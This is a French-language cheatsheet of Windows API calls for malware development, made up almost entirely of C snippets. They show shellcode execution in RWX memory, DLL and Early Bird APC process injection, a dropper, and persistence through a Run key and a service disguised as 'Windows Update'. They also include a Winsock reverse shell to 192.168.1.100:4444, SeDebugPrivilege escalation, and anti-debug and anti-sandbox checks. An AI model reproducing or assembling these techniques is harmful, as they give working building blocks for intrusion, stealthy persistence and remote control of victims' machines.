# Cheatsheet Windows API - Malware Development

## Process Management

### CreateProcess
```c
#include <windows.h>

BOOL CreateProcessA(
    LPCSTR lpApplicationName,       // NULL si commande dans lpCommandLine
    LPSTR lpCommandLine,             // Commande à exécuter
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,           // CREATE_SUSPENDED, etc.
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

// Exemple
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    NULL,
    "cmd.exe /c whoami",
    NULL, NULL, FALSE,
    CREATE_NO_WINDOW,  // Pas de fenêtre
    NULL, NULL, &si, &pi
);

CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
```

### OpenProcess
```c
HANDLE OpenProcess(
    DWORD dwDesiredAccess,    // PROCESS_ALL_ACCESS, PROCESS_VM_WRITE, etc.
    BOOL bInheritHandle,
    DWORD dwProcessId
);

// Exemple - Obtenir handle avec tous droits
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    target_pid
);

if (hProcess == NULL) {
    // Erreur: GetLastError()
}

// Fermer quand terminé
CloseHandle(hProcess);

// Access rights importants
PROCESS_VM_READ         // Lire mémoire
PROCESS_VM_WRITE        // Écrire mémoire
PROCESS_VM_OPERATION    // VirtualAllocEx, etc.
PROCESS_CREATE_THREAD   // CreateRemoteThread
PROCESS_QUERY_INFORMATION
PROCESS_ALL_ACCESS      // Tous droits
```

### TerminateProcess
```c
BOOL TerminateProcess(
    HANDLE hProcess,
    UINT uExitCode
);

TerminateProcess(hProcess, 0);
```

## Memory Management

### VirtualAlloc
```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,      // NULL = choisit auto
    SIZE_T dwSize,         // Taille en bytes
    DWORD flAllocationType, // MEM_COMMIT | MEM_RESERVE
    DWORD flProtect        // PAGE_EXECUTE_READWRITE, etc.
);

// Exemple - Allouer mémoire RWX pour shellcode
LPVOID exec_mem = VirtualAlloc(
    NULL,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

if (exec_mem == NULL) {
    // Erreur
}

memcpy(exec_mem, shellcode, shellcode_size);

// Exécuter
((void(*)())exec_mem)();

// Libérer
VirtualFree(exec_mem, 0, MEM_RELEASE);

// Protection flags
PAGE_EXECUTE_READWRITE  // RWX (suspect!)
PAGE_EXECUTE_READ       // RX
PAGE_READWRITE          // RW
PAGE_READONLY           // R
```

### VirtualAllocEx (Remote Process)
```c
LPVOID VirtualAllocEx(
    HANDLE hProcess,       // Handle process distant
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

// Exemple - Process injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

LPVOID remote_buffer = VirtualAllocEx(
    hProcess,
    NULL,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

### VirtualProtect
```c
BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);

// Exemple - Changer protection mémoire
DWORD old_protect;
VirtualProtect(
    target_addr,
    size,
    PAGE_EXECUTE_READWRITE,
    &old_protect
);

// Modifier mémoire...

// Restaurer protection
VirtualProtect(target_addr, size, old_protect, &old_protect);
```

### ReadProcessMemory / WriteProcessMemory
```c
BOOL ReadProcessMemory(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesRead
);

BOOL WriteProcessMemory(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);

// Exemple - Process injection
WriteProcessMemory(
    hProcess,
    remote_buffer,
    shellcode,
    shellcode_size,
    NULL
);
```

## Thread Management

### CreateThread
```c
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,  // Fonction à exécuter
    LPVOID lpParameter,                      // Argument
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

// Exemple
DWORD WINAPI thread_func(LPVOID param) {
    // Code du thread
    return 0;
}

HANDLE hThread = CreateThread(
    NULL,
    0,
    thread_func,
    NULL,
    0,
    NULL
);

WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
```

### CreateRemoteThread (Code Injection)
```c
HANDLE CreateRemoteThread(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,  // Adresse dans process distant
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

// Exemple classique - DLL injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// Allouer mémoire pour path DLL
LPVOID remote_string = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1,
                                       MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, remote_string, dll_path, strlen(dll_path) + 1, NULL);

// Obtenir adresse LoadLibraryA
LPVOID loadlib_addr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

// Créer thread distant qui appelle LoadLibraryA(dll_path)
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL, 0,
    (LPTHREAD_START_ROUTINE)loadlib_addr,
    remote_string,
    0, NULL
);

WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
CloseHandle(hProcess);
```

### QueueUserAPC (APC Injection)
```c
DWORD QueueUserAPC(
    PAPCFUNC pfnAPC,      // Fonction à exécuter
    HANDLE hThread,       // Thread cible
    ULONG_PTR dwData      // Paramètre
);

// Exemple - Early Bird injection
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

// Créer process suspendu
CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Allouer et écrire shellcode
LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, shellcode_size,
                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote_mem, shellcode, shellcode_size, NULL);

// Queue APC
QueueUserAPC((PAPCFUNC)remote_mem, pi.hThread, 0);

// Reprendre thread
ResumeThread(pi.hThread);
```

## DLL Management

### LoadLibrary
```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName);
HMODULE LoadLibraryW(LPCWSTR lpLibFileName);

// Exemple
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
if (hNtdll == NULL) {
    // Erreur
}

FreeLibrary(hNtdll);
```

### GetProcAddress
```c
FARPROC GetProcAddress(
    HMODULE hModule,
    LPCSTR lpProcName
);

// Exemple - Résolution dynamique
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
FARPROC pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");

// Cast vers fonction pointer
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
VirtualAlloc_t MyVirtualAlloc = (VirtualAlloc_t)pVirtualAlloc;

LPVOID mem = MyVirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
```

### GetModuleHandle
```c
HMODULE GetModuleHandleA(LPCSTR lpModuleName);

// Exemple
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");  // Déjà chargé
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
HMODULE hThisExe = GetModuleHandleA(NULL);  // Module courant
```

## File Operations

### CreateFile
```c
HANDLE CreateFileA(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,      // GENERIC_READ, GENERIC_WRITE
    DWORD dwShareMode,          // FILE_SHARE_READ, etc.
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition, // CREATE_ALWAYS, OPEN_EXISTING, etc.
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

// Exemple - Lire fichier
HANDLE hFile = CreateFileA(
    "C:\\target.exe",
    GENERIC_READ,
    FILE_SHARE_READ,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

if (hFile == INVALID_HANDLE_VALUE) {
    // Erreur
}

CloseHandle(hFile);
```

### ReadFile / WriteFile
```c
BOOL ReadFile(
    HANDLE hFile,
    LPVOID lpBuffer,
    DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);

BOOL WriteFile(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

// Exemple - Dropper
HANDLE hFile = CreateFileA("payload.exe", GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
DWORD written;
WriteFile(hFile, payload_data, payload_size, &written, NULL);
CloseHandle(hFile);

// Exécuter
system("payload.exe");
```

### GetFileSize
```c
DWORD GetFileSize(
    HANDLE hFile,
    LPDWORD lpFileSizeHigh
);

// Exemple
DWORD file_size = GetFileSize(hFile, NULL);
unsigned char *buffer = malloc(file_size);
ReadFile(hFile, buffer, file_size, &bytes_read, NULL);
```

## Registry Operations

### RegOpenKeyEx
```c
LSTATUS RegOpenKeyExA(
    HKEY hKey,              // HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, etc.
    LPCSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,      // KEY_READ, KEY_WRITE, KEY_ALL_ACCESS
    PHKEY phkResult
);

// Exemple
HKEY hKey;
RegOpenKeyExA(
    HKEY_LOCAL_MACHINE,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,
    KEY_WRITE,
    &hKey
);

RegCloseKey(hKey);
```

### RegSetValueEx
```c
LSTATUS RegSetValueExA(
    HKEY hKey,
    LPCSTR lpValueName,
    DWORD Reserved,
    DWORD dwType,           // REG_SZ, REG_DWORD, etc.
    const BYTE *lpData,
    DWORD cbData
);

// Exemple - Persistence via Run key
HKEY hKey;
RegOpenKeyExA(HKEY_CURRENT_USER,
              "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              0, KEY_WRITE, &hKey);

char payload_path[] = "C:\\Windows\\Temp\\malware.exe";
RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
               (BYTE*)payload_path, strlen(payload_path));

RegCloseKey(hKey);
```

### RegQueryValueEx
```c
LSTATUS RegQueryValueExA(
    HKEY hKey,
    LPCSTR lpValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
);

// Exemple
DWORD data_size = 256;
char data[256];
RegQueryValueExA(hKey, "ValueName", NULL, NULL, (LPBYTE)data, &data_size);
```

## Network Operations (Winsock)

### WSAStartup
```c
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int WSAStartup(
    WORD wVersionRequested,
    LPWSADATA lpWSAData
);

// Exemple - Init Winsock
WSADATA wsa;
WSAStartup(MAKEWORD(2, 2), &wsa);

// Cleanup
WSACleanup();
```

### socket, connect (Reverse Shell)
```c
// Créer socket
SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

// Configurer destination
struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(4444);
server.sin_addr.s_addr = inet_addr("192.168.1.100");

// Connecter
connect(s, (struct sockaddr*)&server, sizeof(server));

// Rediriger stdin/stdout/stderr vers socket
STARTUPINFO si = {0};
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

// Attendre
WaitForSingleObject(pi.hProcess, INFINITE);
closesocket(s);
```

### send / recv
```c
int send(SOCKET s, const char *buf, int len, int flags);
int recv(SOCKET s, char *buf, int len, int flags);

// Exemple
char buffer[1024];
int bytes = recv(s, buffer, sizeof(buffer), 0);
send(s, "Response", 8, 0);
```

## Privilege Escalation

### AdjustTokenPrivileges
```c
BOOL AdjustTokenPrivileges(
    HANDLE TokenHandle,
    BOOL DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD ReturnLength
);

// Exemple - Enable SeDebugPrivilege
HANDLE hToken;
TOKEN_PRIVILEGES tp;
LUID luid;

OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
CloseHandle(hToken);
```

## Service Management

### CreateService
```c
SC_HANDLE CreateServiceA(
    SC_HANDLE hSCManager,
    LPCSTR lpServiceName,
    LPCSTR lpDisplayName,
    DWORD dwDesiredAccess,
    DWORD dwServiceType,
    DWORD dwStartType,
    DWORD dwErrorControl,
    LPCSTR lpBinaryPathName,
    LPCSTR lpLoadOrderGroup,
    LPDWORD lpdwTagId,
    LPCSTR lpDependencies,
    LPCSTR lpServiceStartName,
    LPCSTR lpPassword
);

// Exemple - Persistence via service
SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

SC_HANDLE hService = CreateServiceA(
    hSCM,
    "MalwareService",
    "Windows Update Service",
    SERVICE_ALL_ACCESS,
    SERVICE_WIN32_OWN_PROCESS,
    SERVICE_AUTO_START,
    SERVICE_ERROR_IGNORE,
    "C:\\Windows\\Temp\\malware.exe",
    NULL, NULL, NULL, NULL, NULL
);

StartServiceA(hService, 0, NULL);
CloseServiceHandle(hService);
CloseServiceHandle(hSCM);
```

## Anti-Analysis

### IsDebuggerPresent
```c
BOOL IsDebuggerPresent(void);

// Exemple
if (IsDebuggerPresent()) {
    ExitProcess(0);  // Anti-debug
}
```

### CheckRemoteDebuggerPresent
```c
BOOL CheckRemoteDebuggerPresent(
    HANDLE hProcess,
    PBOOL pbDebuggerPresent
);

BOOL debugger_present;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger_present);
if (debugger_present) {
    ExitProcess(0);
}
```

### Sleep (Anti-Sandbox)
```c
void Sleep(DWORD dwMilliseconds);

// Anti-sandbox: sandboxes skip long sleeps
DWORD start = GetTickCount();
Sleep(10000);  // 10 seconds
DWORD end = GetTickCount();

if ((end - start) < 9000) {
    // Sandbox détecté (sleep skippé)
    ExitProcess(0);
}
```

## Utilitaires

### GetLastError
```c
DWORD GetLastError(void);

// Exemple
if (CreateFileA(...) == INVALID_HANDLE_VALUE) {
    DWORD error = GetLastError();
    // ERROR_FILE_NOT_FOUND = 2
    // ERROR_ACCESS_DENIED = 5
}
```

### GetModuleFileName
```c
DWORD GetModuleFileNameA(
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
);

// Exemple - Obtenir path de l'exe
char path[MAX_PATH];
GetModuleFileNameA(NULL, path, MAX_PATH);
```

### GetProcId (non-officielle)
```c
// Helper pour obtenir PID par nom
DWORD GetProcId(const char *proc_name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);

    if (Process32First(hSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, proc_name) == 0) {
                CloseHandle(hSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return 0;
}
```

### Timing (Anti-Debug)
```c
DWORD GetTickCount(void);
ULONGLONG GetTickCount64(void);

// Timing attack
DWORD start = GetTickCount();
// Code sensible
DWORD end = GetTickCount();
if ((end - start) > 100) {
    // Breakpoint/slow execution détecté
}
```
